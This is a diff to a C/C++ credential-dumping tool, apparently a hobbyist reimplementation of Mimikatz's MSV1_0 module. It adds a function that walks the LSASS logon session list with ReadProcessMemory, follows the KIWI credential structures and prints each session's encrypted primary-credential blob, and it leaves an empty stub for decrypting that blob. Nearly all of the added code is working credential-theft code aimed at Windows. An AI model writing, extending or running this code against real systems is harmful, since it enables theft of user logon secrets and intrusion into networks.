@@ -308,6 +308,71 @@ typedef struct _LSA_LOGON_SESSION {
 	UNICODE_STRING Domain;    // 0xa0
 } LSA_LOGON_SESSION;
 
+
+
+void decryptBlob(HANDLE hTarget) {
+
+}
+void getSecurityBlob(HANDLE hTarget, PVOID pLogonSessionList) {
+
+	// Step 1: read the head pointer (points into LSASS memory)
+	PKIWI_MSV1_0_LIST_63 headPtr = NULL;
+	if (!ReadProcessMemory(hTarget, pLogonSessionList, &headPtr, sizeof(headPtr), NULL) || !headPtr) {
+		printf("[-] Failed to read head pointer\n");
+		return;
+	}
+
+	// Step 2: read the head node structure
+	KIWI_MSV1_0_LIST_63 head = { 0 };
+	if (!ReadProcessMemory(hTarget, headPtr, &head, sizeof(head), NULL)) {
+		printf("[-] Failed to read head struct\n");
+		return;
+	}
+
+	// Step 3: iterate the linked list
+	PKIWI_MSV1_0_LIST_63 current = head.Flink;
+	while (current && current != headPtr) {
+		KIWI_MSV1_0_LIST_63 node = { 0 };
+		if (!ReadProcessMemory(hTarget, current, &node, sizeof(node), NULL)) {
+			printf("[-] Failed to read node @ %p\n", current);
+			break;
+		}
+		printf("\n\nLOCAL KIWI STRUCT 0x%p\n", &node);
+
+		printf("Attempting to read security blob\n");
+		if (node.Credentials) { // base + 0x108
+			printf("Pointer to KIWI_MSV1_0_CREDENTIALS found at: 0x%p\n", node.Credentials);
+			KIWI_MSV1_0_CREDENTIALS Credentials = { 0 };
+			if (ReadProcessMemory(hTarget, node.Credentials, &Credentials, sizeof(KIWI_MSV1_0_CREDENTIALS), NULL)) { //place struct in at this address
+				printf("REMOTE Pointer to KIWI_MSV1_0_CREDENTIALS found at: 0x%p\n", node.Credentials);
+				printf("local Pointer to KIWI_MSV1_0_CREDENTIALS found at: 0x%p\n", &Credentials);
+
+				//read local address for new pointer
+				PKIWI_MSV1_0_PRIMARY_CREDENTIALS pPrimaryCredentials = Credentials.PrimaryCredentials;
+				KIWI_MSV1_0_PRIMARY_CREDENTIALS PrimaryCredentials = { 0 };
+				getchar();
+				if (ReadProcessMemory(hTarget, pPrimaryCredentials, &PrimaryCredentials, sizeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS), NULL)) {
+					LSA_UNICODE_STRING LsaUnicodeString = PrimaryCredentials.Credentials;
+					wchar_t blob[0x1B0] = { 0 }; //size of blob = 0x1B0
+					SIZE_T bytesToRead = min(LsaUnicodeString.Length, sizeof(blob) - sizeof(wchar_t));
+					if (ReadProcessMemory(hTarget, LsaUnicodeString.Buffer, blob, bytesToRead, NULL)) {
+						// Length is in bytes, so divide by sizeof(WCHAR)
+						wprintf(L"[+] Security Blob: %.*s\n", LsaUnicodeString.Length / sizeof(WCHAR), blob);
+						//decryptBlob(blob);
+					}
+					else {
+						printf("[-] Failed to read Lsa Unicode String buffer @ %p\n",LsaUnicodeString.Buffer);
+					}
+				}
+				printf("\n");
+			}
+		}
+		else {
+			printf("Error reading Credentials struct");
+		}
+	}
+}
+
 void userlandExtraction(HANDLE hTarget, PVOID pLogonSessionList) {
 	// Step 1: read the head pointer (points into LSASS memory)
 	PKIWI_MSV1_0_LIST_63 headPtr = NULL;
@@ -331,6 +396,9 @@ void userlandExtraction(HANDLE hTarget, PVOID pLogonSessionList) {
 			printf("[-] Failed to read node @ %p\n", current);
 			break;
 		}
+		printf("KIWI STRUCT 0x%p\n", node);
+		printf("Username Buffer 0x%p", node.UserName.Buffer);
+
 
 		// Step 4: read the username if present
 		if (node.UserName.Buffer && node.UserName.Length > 0) {
@@ -344,11 +412,11 @@ void userlandExtraction(HANDLE hTarget, PVOID pLogonSessionList) {
 			else {
 				printf("[-] Failed to read username buffer @ %p\n", node.UserName.Buffer);
 			}
+
 		}
 		else {
 			printf("[*] NO USERNAME\n");
 		}
-
 		// Step 5: advance
 		current = node.Flink;
 	}
@@ -366,6 +434,9 @@ uintptr_t get_rip_relative_address(uint8_t* instr)
 
 	return rip + offset;
 }
+
+
+
 
 int main(int argc, wchar_t* argv[]) {
 	//Driver stuf...
@@ -467,9 +538,13 @@ int main(int argc, wchar_t* argv[]) {
 		printf("RIP-relative target = 0x%llx\n", target); //i need to learn how this shit works like actually cos this is so confusing.
 	}
 
+	printf("Offset of Credentials = 0x%zx\n",offsetof(KIWI_MSV1_0_LIST_63, Credentials)); //offset A0?
 	PVOID pLogonSessionList = (PVOID)(uintptr_t)target;
+
 	userlandExtraction(hTarget, (PVOID)pLogonSessionList);
-	
+	getSecurityBlob(hTarget, (PVOID)pLogonSessionList);
+
+	getchar();
 	std::cout << "Hello world\n";
 
 	return 0;
